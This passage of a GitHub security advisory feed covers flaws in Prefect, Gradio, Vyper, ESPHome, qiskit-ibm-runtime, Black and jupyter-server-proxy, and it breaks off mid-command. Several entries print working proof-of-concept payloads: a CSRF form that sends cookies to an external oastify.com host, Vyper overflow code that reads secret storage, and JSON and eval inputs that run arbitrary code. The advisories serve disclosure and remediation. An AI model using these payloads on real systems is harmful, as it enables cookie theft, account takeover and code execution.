        <content type="html"><![CDATA[<p>An attacker is able to steal secrets and potentially gain remote code execution via CSRF using a self-hosted, open source Prefect API.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6022">https://nvd.nist.gov/vuln/detail/CVE-2023-6022</a></li>
<li><a href="https://huntr.com/bounties/dab47d99-551c-4355-9ab1-c99cb90235af">https://huntr.com/bounties/dab47d99-551c-4355-9ab1-c99cb90235af</a></li>
<li><a href="https://github.com/PrefectHQ/prefect/blob/main/RELEASE-NOTES.md#release-2165">https://github.com/PrefectHQ/prefect/blob/main/RELEASE-NOTES.md#release-2165</a></li>
<li><a href="https://github.com/advisories/GHSA-4hh5-2678-83fx">https://github.com/advisories/GHSA-4hh5-2678-83fx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4hh5-2678-83fx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-16T18:30:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gradio] Cross-Site Request Forgery in Gradio]]></title>
        <id>https://github.com/advisories/GHSA-3x9g-xfj5-fq84</id>
        <link href="https://github.com/advisories/GHSA-3x9g-xfj5-fq84"/>
        <updated>2024-03-22T13:12:18.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Request Forgery gives attackers the ability to upload many large files to a victim, if they are running Gradio locally. To resolve this a PR tightening the CORS rules around Gradio applications has been submitted. In particular, it checks to see if the host header is localhost (or one of its aliases) and if so, it requires the origin header (if present) to be localhost (or one of its aliases) as well.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1727">https://nvd.nist.gov/vuln/detail/CVE-2024-1727</a></li>
<li><a href="https://github.com/gradio-app/gradio/commit/84802ee6a4806c25287344dce581f9548a99834a">https://github.com/gradio-app/gradio/commit/84802ee6a4806c25287344dce581f9548a99834a</a></li>
<li><a href="https://huntr.com/bounties/a94d55fb-0770-4cbe-9b20-97a978a2ffff">https://huntr.com/bounties/a94d55fb-0770-4cbe-9b20-97a978a2ffff</a></li>
<li><a href="https://github.com/gradio-app/gradio/pull/7503">https://github.com/gradio-app/gradio/pull/7503</a></li>
<li><a href="https://github.com/advisories/GHSA-3x9g-xfj5-fq84">https://github.com/advisories/GHSA-3x9g-xfj5-fq84</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3x9g-xfj5-fq84</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-21T21:31:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] Vyper's bounds check on built-in `slice()` function can be overflowed]]></title>
        <id>https://github.com/advisories/GHSA-9x7f-gwxq-6f2c</id>
        <link href="https://github.com/advisories/GHSA-9x7f-gwxq-6f2c"/>
        <updated>2024-03-21T21:59:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><a href="https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457">The bounds check for slices</a> does not account for the ability for <code>start + length</code> to overflow when the values aren't literals. </p>
<p>If a <code>slice()</code> function uses a non-literal argument for the <code>start</code>  or <code>length</code> variable, this creates the ability for an attacker to overflow the bounds check. </p>
<p>This issue can be used to do OOB access to storage, memory or calldata addresses. It can also be used to corrupt the <code>length</code> slot of the respective array.</p>
<p>A contract search was performed and no vulnerable contracts were found in production.</p>
<p>tracking in issue <a href="https://github.com/vyperlang/vyper/issues/3756">https://github.com/vyperlang/vyper/issues/3756</a>.
patched in <a href="https://github.com/vyperlang/vyper/pull/3818">https://github.com/vyperlang/vyper/pull/3818</a>.</p>
<h2 id="details">Details</h2>
<p>Here the flow for <code>storage</code> is supposed, but it is generalizable also for the other locations.</p>
<p>When calling <code>slice()</code> on a storage value, there are compile time bounds checks if the <code>start</code> and <code>length</code> values are literals, but of course this cannot happen if they are passed values:</p>
<pre><code class="language-python">if not is_adhoc_slice:
    if length_literal is not None:
        if length_literal &lt; 1:
            raise ArgumentException("Length cannot be less than 1", length_expr)

        if length_literal &gt; arg_type.length:
            raise ArgumentException(f"slice out of bounds for {arg_type}", length_expr)

    if start_literal is not None:
        if start_literal &gt; arg_type.length:
            raise ArgumentException(f"slice out of bounds for {arg_type}", start_expr)
        if length_literal is not None and start_literal + length_literal &gt; arg_type.length:
            raise ArgumentException(f"slice out of bounds for {arg_type}", node)
</code></pre>
<p>At runtime, we perform the following equivalent check, but the runtime check does not account for overflows:</p>
<pre><code class="language-python">["assert", ["le", ["add", start, length], src_len]],  # bounds check
</code></pre>
<p>The storage <code>slice()</code> function copies bytes directly from storage into memory and returns the memory value of the resulting slice. This means that, if a user is able to input the <code>start</code>  or <code>length</code> value, they can force an overflow and access an unrelated storage slot.</p>
<p>In most cases, this will mean they have the ability to forcibly return <code>0</code> for the slice, even if this shouldn't be possible. In extreme cases, it will mean they can return another unrelated value from storage.</p>
<h2 id="poc-oob-access">POC: OOB access</h2>
<p>For simplicity, take the following Vyper contract, which takes an argument to determine where in a <code>Bytes[64]</code> bytestring should be sliced. It should only accept a value of zero, and should revert in all other cases.</p>
<pre><code class="language-python"># @version ^0.3.9

x: public(Bytes[64])
secret: uint256

@external
def __init__():
    self.x = empty(Bytes[64])
    self.secret = 42

@external
def slice_it(start: uint256) -&gt; Bytes[64]:
    return slice(self.x, start, 64)
</code></pre>
<p>We can use the following manual storage to demonstrate the vulnerability:</p>
<pre><code class="language-json">{"x": {"type": "bytes32", "slot": 0}, "secret": {"type": "uint256", "slot": 3618502788666131106986593281521497120414687020801267626233049500247285301248}}
</code></pre>
<p>If we run the following test, passing <code>max - 63</code> as the <code>start</code> value, we will overflow the bounds check, but access the storage slot at <code>1 + (2**256 - 63) / 32</code>, which is what was set in the above storage layout:</p>
<pre><code class="language-solidity">function test__slice_error() public {
    c = SuperContract(deployer.deploy_with_custom_storage("src/loose/", "slice_error", "slice_error_storage"));
    bytes memory result = c.slice_it(115792089237316195423570985008687907853269984665640564039457584007913129639872); // max - 63
    console.logBytes(result);
}
</code></pre>
<p>The result is that we return the secret value from storage:</p>
<pre><code>Logs:
0x0000...00002a
</code></pre>
<h2 id="poc-length-corruption">POC: <code>length</code> corruption</h2>
<p><code>OOG</code> exception doesn't have to be raised - because of the overflow, only a few bytes can be copied, but the <code>length</code> slot is set with the original input value.</p>
<pre><code class="language-python">d: public(Bytes[256])
    
@external
def test():
    x : uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935 # 2**256-1
    self.d = b"\x01\x02\x03\x04\x05\x06"
    # s : Bytes[256] = slice(self.d, 1, x)
    assert len(slice(self.d, 1, x))==115792089237316195423570985008687907853269984665640564039457584007913129639935
</code></pre>
<p>The corruption of <code>length</code> can be then used to read dirty memory:</p>
<pre><code class="language-python">@external
def test():
    x: uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935  # 2**256 - 1
    y: uint256 = 22704331223003175573249212746801550559464702875615796870481879217237868556850   # 0x3232323232323232323232323232323232323232323232323232323232323232
    z: uint96 = 1
    if True:
        placeholder : uint256[16] = [y, y, y, y, y, y, y, y, y, y, y, y, y, y, y, y]
    s :String[32] = slice(uint2str(z), 1, x)	# uint2str(z) == "1"
    #print(len(s))
    assert slice(s, 1, 2) == "22"
</code></pre>
<h2 id="impact">Impact</h2>
<p>The built-in <code>slice()</code> method can be used for OOB accesses or the corruption of the <code>length</code> slot.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-9x7f-gwxq-6f2c">https://github.com/vyperlang/vyper/security/advisories/GHSA-9x7f-gwxq-6f2c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24561">https://nvd.nist.gov/vuln/detail/CVE-2024-24561</a></li>
<li><a href="https://github.com/vyperlang/vyper/issues/3756">https://github.com/vyperlang/vyper/issues/3756</a></li>
<li><a href="https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457">https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457</a></li>
<li><a href="https://github.com/advisories/GHSA-9x7f-gwxq-6f2c">https://github.com/advisories/GHSA-9x7f-gwxq-6f2c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9x7f-gwxq-6f2c</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-02-01T20:51:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[esphome] ESPHome vulnerable to Authentication bypass via Cross site request forgery]]></title>
        <id>https://github.com/advisories/GHSA-5925-88xh-6h99</id>
        <link href="https://github.com/advisories/GHSA-5925-88xh-6h99"/>
        <updated>2024-03-22T15:42:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>API endpoints in dashboard component of ESPHome version 2023.12.9 (command line installation) are vulnerable to Cross-Site Request Forgery (CSRF) allowing remote attackers to carry out attacks against a logged user of the dashboard to perform operations on configuration files (create, edit, delete).</p>
<h3 id="details">Details</h3>
<p>It is possible for a malicious actor to create a specifically crafted web page that triggers a cross site request against ESPHome, this allows bypassing the authentication for API calls on the platform.</p>
<h3 id="poc">PoC</h3>
<p>An example of malicious web page that abuses this vulnerability:</p>

  
    <form enctype="text/plain" method="POST" id="#main" action="http://localhost:6052/edit?configuration=poc.yaml">
      <input value="y', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>" name="<script>
fetch('https://907zv9yp9u3rjerkiakydpvcr3xulk99.oastify.com?x" type="hidden">
    </form>

<pre><code>&lt;script&gt;
  document.forms[0].submit();
&lt;/script&gt;

&lt;script&gt;
&lt;/script&gt;
</code></pre>
  


<p>In which an attacker creates and weaponizes "poc.yaml" config file containing a cookie exfiltration script and forces the payload triggering visiting the vulnerable page.</p>
<p>Example of such script:</p>



<h3 id="impact">Impact</h3>
<p>This vulnerability allows bypassing authentication on API calls accessing configuration file operations on the behalf of a logged user. In order to trigger the vulnerability, the victim must visit a weaponized page.</p>
<p>In addition to this, it is possible to chain this vulnerability with GHSA-9p43-hj5j-96h5 (as seen in the PoC) to obtain a complete takeover of the user account.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/esphome/esphome/security/advisories/GHSA-5925-88xh-6h99">https://github.com/esphome/esphome/security/advisories/GHSA-5925-88xh-6h99</a></li>
<li><a href="https://github.com/advisories/GHSA-9p43-hj5j-96h5">https://github.com/advisories/GHSA-9p43-hj5j-96h5</a></li>
<li><a href="https://github.com/esphome/esphome/pull/6396">https://github.com/esphome/esphome/pull/6396</a></li>
<li><a href="https://github.com/esphome/esphome/pull/6397">https://github.com/esphome/esphome/pull/6397</a></li>
<li><a href="https://github.com/esphome/esphome/commit/c56c40cb824e34ed2b89ba1cb8a3a5eb31459c74">https://github.com/esphome/esphome/commit/c56c40cb824e34ed2b89ba1cb8a3a5eb31459c74</a></li>
<li><a href="https://github.com/esphome/esphome/releases/tag/2024.3.0">https://github.com/esphome/esphome/releases/tag/2024.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5925-88xh-6h99">https://github.com/advisories/GHSA-5925-88xh-6h99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5925-88xh-6h99</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-21T16:26:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mitogen] Undirectional routing wasn't respected in some cases in Mitogen]]></title>
        <id>https://github.com/advisories/GHSA-8rf6-w2mx-4xjh</id>
        <link href="https://github.com/advisories/GHSA-8rf6-w2mx-4xjh"/>
        <updated>2024-03-21T16:17:13.000Z</updated>
        <content type="html"><![CDATA[<p>core.py in Mitogen before 0.2.8 has a typo that drops the unidirectional-routing protection mechanism in the case of a child that is initiated by another child. The Ansible extension is unaffected. NOTE: the vendor disputes this issue because it is exploitable only in conjunction with hypothetical other factors, i.e., an affected use case within a library caller, and a bug in the message receiver policy code that led to reliance on this extra protection mechanism.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-15149">https://nvd.nist.gov/vuln/detail/CVE-2019-15149</a></li>
<li><a href="https://github.com/dw/mitogen/commit/5924af1566763e48c42028399ea0cd95c457b3dc">https://github.com/dw/mitogen/commit/5924af1566763e48c42028399ea0cd95c457b3dc</a></li>
<li><a href="https://mitogen.networkgenomics.com/changelog.html#v0-2-8-2019-08-18">https://mitogen.networkgenomics.com/changelog.html#v0-2-8-2019-08-18</a></li>
<li><a href="https://github.com/advisories/GHSA-8rf6-w2mx-4xjh">https://github.com/advisories/GHSA-8rf6-w2mx-4xjh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8rf6-w2mx-4xjh</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2019-08-19T23:45:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[oauthenticator] GoogleOAuthenticator.hosted_domain incorrectly verifies membership of an Google organization/workspace]]></title>
        <id>https://github.com/advisories/GHSA-55m3-44xf-hg4h</id>
        <link href="https://github.com/advisories/GHSA-55m3-44xf-hg4h"/>
        <updated>2024-03-20T21:37:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary-and-impact">Summary and impact</h2>
<p><a href="https://oauthenticator.readthedocs.io/en/latest/reference/api/gen/oauthenticator.google.html#oauthenticator.google.GoogleOAuthenticator.hosted_domain"><code>GoogleOAuthenticator.hosted_domain</code></a> is used to restrict what Google accounts can be authorized to access a JupyterHub. The restriction <em>is intended</em> to ensure Google accounts are part of one or more Google organizations/workspaces verified to control specified domain(s).</p>
<p>The vulnerability is that the actual restriction has been to Google accounts with emails ending with the domain. Such accounts could have been created by anyone which at one time was able to read an email associated with the domain. This was described by Dylan Ayrey (@dxa4481) in this <a href="https://trufflesecurity.com/blog/google-oauth-is-broken-sort-of/">blog post</a> from 15th December 2023.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade to <code>oauthenticator&gt;=16.3.0</code> or restrict who can login another way, such as <a href="https://oauthenticator.readthedocs.io/en/latest/reference/api/gen/oauthenticator.google.html#oauthenticator.google.GoogleOAuthenticator.allowed_users"><code>allowed_users</code></a> or <a href="https://oauthenticator.readthedocs.io/en/latest/reference/api/gen/oauthenticator.google.html#oauthenticator.google.GoogleOAuthenticator.allowed_google_groups"><code>allowed_google_groups</code></a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterhub/oauthenticator/security/advisories/GHSA-55m3-44xf-hg4h">https://github.com/jupyterhub/oauthenticator/security/advisories/GHSA-55m3-44xf-hg4h</a></li>
<li><a href="https://github.com/jupyterhub/oauthenticator/commit/5246b09675501b09fb6ed64022099b7644812f60">https://github.com/jupyterhub/oauthenticator/commit/5246b09675501b09fb6ed64022099b7644812f60</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29033">https://nvd.nist.gov/vuln/detail/CVE-2024-29033</a></li>
<li><a href="https://trufflesecurity.com/blog/google-oauth-is-broken-sort-of">https://trufflesecurity.com/blog/google-oauth-is-broken-sort-of</a></li>
<li><a href="https://github.com/advisories/GHSA-55m3-44xf-hg4h">https://github.com/advisories/GHSA-55m3-44xf-hg4h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-55m3-44xf-hg4h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T18:02:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[qiskit-ibm-runtime] `qiskit_ibm_runtime.RuntimeDecoder` can execute arbitrary code]]></title>
        <id>https://github.com/advisories/GHSA-x4x5-jv3x-9c7m</id>
        <link href="https://github.com/advisories/GHSA-x4x5-jv3x-9c7m"/>
        <updated>2024-03-20T21:37:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>deserializing json data using <code>qiskit_ibm_runtime.RuntimeDecoder</code> can be made to execute arbitrary code given a correctly formatted input string</p>
<h3 id="details">Details</h3>
<p><code>RuntimeDecoder</code> is supposed to be able to deserialize JSON strings containing various special types encoded via <code>RuntimeEncoder</code>. However, one can structure a malicious payload to cause the decoder to spawn a subprocess and execute arbitrary code, exploiting this block of code: <a href="https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159">https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159</a></p>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">malicious_data = {
    "__type__": "settings",
    "__module__": "subprocess",
    "__class__": "Popen",
    "__value__": {
        "args": ["echo", "hi"]
    },
}
json_str = json.dumps(malicious_data)

_ = json.loads(json_str, cls=qiskit_ibm_runtime.RuntimeDecoder)  # prints "hi" to the terminal
</code></pre>
<p>(where obviously "echo hi" can be replaced with something much more malicious)</p>
<p>notably the following also makes it through the runtime API, with <code>malicious_data</code> serialized client-side via <code>RuntimeEncoder</code> (and therefore presumably deserialized server-side via <code>RuntimeDecoder</code>?)</p>
<pre><code class="language-python">service = qiskit_ibm_runtime(&lt;ibm_cloud_credentials&gt;)
job = service.run("qasm3-runner", malicious_data)
print(job.status())  # prints "JobStatus.QUEUED"
</code></pre>
<h3 id="impact">Impact</h3>
<p>i don't know if <code>qiskit_ibm_runtime.RuntimeDecoder</code> is used server-side so this may or may not be a serious vulnerability on your end (however it's definitely a security hole for anyone using the library to deserialize third-party data)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-x4x5-jv3x-9c7m">https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-x4x5-jv3x-9c7m</a></li>
<li><a href="https://github.com/Qiskit/qiskit-ibm-runtime/commit/b78fca114133051805d00043a404b25a33835f4d">https://github.com/Qiskit/qiskit-ibm-runtime/commit/b78fca114133051805d00043a404b25a33835f4d</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29032">https://nvd.nist.gov/vuln/detail/CVE-2024-29032</a></li>
<li><a href="https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159">https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159</a></li>
<li><a href="https://github.com/advisories/GHSA-x4x5-jv3x-9c7m">https://github.com/advisories/GHSA-x4x5-jv3x-9c7m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x4x5-jv3x-9c7m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-20T15:44:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[qiskit-ibm-runtime] Dynamic Variable Evaluation in qiskit-ibm-runtime]]></title>
        <id>https://github.com/advisories/GHSA-cq96-9974-v8hm</id>
        <link href="https://github.com/advisories/GHSA-cq96-9974-v8hm"/>
        <updated>2024-03-20T15:41:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An <code>eval()</code> method exists <code>Options._get_program_inputs</code>. This is bad in any case, but especially bad because <code>Options</code> are also used server side, so this has the potential to expose arbitrary code injection in runtime containers, now or at a later time.</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/Qiskit/qiskit-ibm-runtime/blob/da94a42060f1a22e6f306227deb45b70e0075723/qiskit_ibm_runtime/options/options.py#L140">https://github.com/Qiskit/qiskit-ibm-runtime/blob/da94a42060f1a22e6f306227deb45b70e0075723/qiskit_ibm_runtime/options/options.py#L140</a></p>
<h3 id="poc">PoC</h3>
<p>A local exploit would be something like</p>
<pre><code class="language-python">from qiskit import transpiler

class BadActor(transpiler.CouplingMap):
    def __str__(self):
        return "print('external code')"
</code></pre>
<p>Where <code>print("external code")</code> can be any arbitrary python code string.</p>
<p>Then if you did a normal workflow and used a specifically constructed <code>CouplingMap</code> subclass like <code>BadActor</code> above:</p>
<pre><code class="language-python">from qiskit_ibm_runtime import QiskitRuntimeService, Session, Options, Sampler
from qiskit import QuantumCircuit

cmap = BadActor.from_line(42)
service = QiskitRuntimeService()
options = Options(optimization_level=1)
options.simulator = dict(coupling_map=cmap))

bell = QuantumCircuit(2)
bell.h(0)
bell.cx(0, 1)
bell.measure_all()

with Session(service=service, backend="ibmq_qasm_simulator") as session:
    sampler = Sampler(session=session, options=options).run(bell)
</code></pre>
<p>This will print <code>external code</code></p>
<h3 id="impact">Impact</h3>
<p>Security vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-cq96-9974-v8hm">https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-cq96-9974-v8hm</a></li>
<li><a href="https://github.com/Qiskit/qiskit-ibm-runtime/commit/2e8c8c8df83ba310f52d1651a426bad879e0bd38">https://github.com/Qiskit/qiskit-ibm-runtime/commit/2e8c8c8df83ba310f52d1651a426bad879e0bd38</a></li>
<li><a href="https://github.com/advisories/GHSA-cq96-9974-v8hm">https://github.com/advisories/GHSA-cq96-9974-v8hm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cq96-9974-v8hm</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-03-20T15:41:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[black] Black vulnerable to Regular Expression Denial of Service (ReDoS)]]></title>
        <id>https://github.com/advisories/GHSA-fj7x-q9j7-g6q6</id>
        <link href="https://github.com/advisories/GHSA-fj7x-q9j7-g6q6"/>
        <updated>2024-03-20T15:24:02.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package black before 24.3.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the lines_with_leading_tabs_expanded function in the strings.py file. An attacker could exploit this vulnerability by crafting a malicious input that causes a denial of service.</p>
<p>Exploiting this vulnerability is possible when running Black on untrusted input, or if you habitually put thousands of leading tab characters in your docstrings.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21503">https://nvd.nist.gov/vuln/detail/CVE-2024-21503</a></li>
<li><a href="https://github.com/psf/black/commit/f00093672628d212b8965a8993cee8bedf5fe9b8">https://github.com/psf/black/commit/f00093672628d212b8965a8993cee8bedf5fe9b8</a></li>
<li><a href="https://github.com/psf/black/releases/tag/24.3.0">https://github.com/psf/black/releases/tag/24.3.0</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-BLACK-6256273">https://security.snyk.io/vuln/SNYK-PYTHON-BLACK-6256273</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/black/PYSEC-2024-48.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/black/PYSEC-2024-48.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-fj7x-q9j7-g6q6">https://github.com/advisories/GHSA-fj7x-q9j7-g6q6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fj7x-q9j7-g6q6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-19T06:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyter-server-proxy] Jupyter Server Proxy's Websocket Proxying does not require authentication]]></title>
        <id>https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</id>
        <link href="https://github.com/advisories/GHSA-w3vc-fx9p-wp4v"/>
        <updated>2024-03-20T21:38:04.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>jupyter-server-proxy</code> is used to expose ports local to a Jupyter server listening to web traffic to the Jupyter server's <em>authenticated users</em> by proxying web requests and websockets. Dependent packages (<a href="https://www.wheelodex.org/projects/jupyter-server-proxy/rdepends/">partial list</a>) also use <code>jupyter-server-proxy</code> to expose other popular interactive applications (such as <a href="https://github.com/jupyterhub/jupyter-rsession-proxy">RStudio</a>, <a href="https://github.com/jupyterhub/jupyter-remote-desktop-proxy">Linux Desktop via VNC</a>, <a href="https://github.com/betatim/vscode-binder">Code Server</a>, <a href="https://github.com/holoviz/jupyter-panel-proxy">Panel</a>, etc) along with the Jupyter server. This feature is commonly used in hosted environments (such as a JupyterHub) to expose non-Jupyter interactive frontends or APIs to the user.</p>
<p><code>jupyter-server-proxy</code> did not check user authentication appropriately when proxying websockets, allowing unauthenticated access to anyone who had network access to the Jupyter server endpoint.</p>
<h2 id="impact">Impact</h2>
<p>This vulnerability can allow unauthenticated remote access to any websocket endpoint set up to be accessible via <code>jupyter-server-proxy</code>. In many cases (such as when exposing RStudio via <a href="https://github.com/jupyterhub/jupyter-rsession-proxy"><code>jupyter-rsession-proxy</code></a> or a remote Linux Desktop / VNC via <a href="https://github.com/jupyterhub/jupyter-remote-desktop-proxy"><code>jupyter-remote-desktop-proxy</code></a>), this leads to <strong>remote unauthenticated arbitrary code execution</strong>, due to how they use websockets. The websocket endpoints exposed by <code>jupyter_server</code> itself is not affected. Projects that do not rely on websockets are also not affected.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade <code>jupyter-server-proxy</code> to a patched version and restart any running Jupyter server.</p>
<p>You may not be installing <code>jupyter-server-proxy</code> directly, but have it be pulled in as a dependency (<a href="https://www.wheelodex.org/projects/jupyter-server-proxy/rdepends/">partial list of dependent packages</a>) - so you may be vulnerable even if you aren't directly depending on <code>jupyter-server-proxy</code>.</p>
<h3 id="for-jupyterhub-admins-of-tljh-installations">For JupyterHub admins of <a href="https://tljh.jupyter.org">TLJH</a> installations</h3>
<details><summary>Expand to read more</summary>

<p>To secure a tljh deployment's user servers, first check if <code>jupyter-server-proxy</code> is installed in the user environment with a vulnerable version. If it is, patch the vulnerability and consider terminating currently running user servers.</p>
<h4 id="1-check-for-vulnerability">1. Check for vulnerability</h4>
<p>As an JupyterHub admin from a terminal in a started user server, you can do:</p>
<pre><code class="language-bash">sudo -E python3 -c '
try:
    import jupyter_server_proxy
    is_vulnerable = not hasattr(jupyter_server_proxy, "__version__")
except:
    is_vulnerable = False
if is_vulnerable:
    print("WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.")
else:
    print("INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v")
'
</code></pre>
<p>Alternatively as a root user on the server where tljh is installed, you can do:</p>
<pre><code class="language-bash">sudo PATH=/opt/tljh/user/bin:${PATH} python3 -c '
try:
    import jupyter_server_proxy
    is_vulnerable = not hasattr(jupyter_server_proxy, "__version__")
except:
    is_vulnerable = False
if is_vulnerable:
    print("WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.")
else:
    print("INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v")
'
</code></pre>
<h4 id="2-patch-detected-vulnerability">2. Patch detected vulnerability</h4>
<p>As an JupyterHub admin from a terminal in a started user server, you can do:</p>
<pre><code class="language-bash">sudo -E pip install "jupyter-server-proxy&gt;=3.2.3,!=4.0.0,!=4.1.0"
</code></pre>
<p>Alternatively as a root user on the server where tljh is installed, you can do:</p>
<pre><code class="language-bash">sudo PATH=/opt/tljh/user/bin:${PATH} pip install "jupyter-server-proxy&gt;=3.2.3,!=4.0.0,!=4.1.0"
</code></pre>
<h4 id="3-consider-terminating-currently-running-user-servers">3. Consider terminating currently running user servers</h4>
<p>User servers that started before the patch was applied are still vulnerable. To ensure they aren't vulnerable any more you could forcefully terminate their servers via the JupyterHub web interface at <code>https://&lt;your domain&gt;/hub/admin</code>.</p>
</details>

<h3 id="for-jupyterhub-admins-of-z2jh-installations">For JupyterHub admins of <a href="https://z2jh.jupyter.org">Z2JH</a> installations</h3>
<details><summary>Expand to read more</summary>

<p>To secure your z2jh deployment's user servers, first consider if one or more user environments is or may be vulnerable, then ensure new user servers' aren't started with the vulnerability, and finally consider terminating currently running user servers. The steps below guide you to do so.</p>
<h4 id="1-check-for-vulnerabilities">1. Check for vulnerabilities</h4>
<p>Consider all docker images that user servers' environment may be based on. If your deployment expose a fixed set of images, you may be able to update them to non-vulnerable versions.</p>
<p>To check if an individual docker image is vulnerable, use a command like:</p>
<pre><code class="language-bash">CHECK_IMAGE=jupyter/base-notebook:2023-10-20
docker run --rm $CHECK_IMAGE python3 -c '
try:
    import jupyter_server_proxy
    is_vulnerable = not hasattr(jupyter_server_proxy, "__version__")
except:
    is_vulnerable = False
if is_vulnerable:
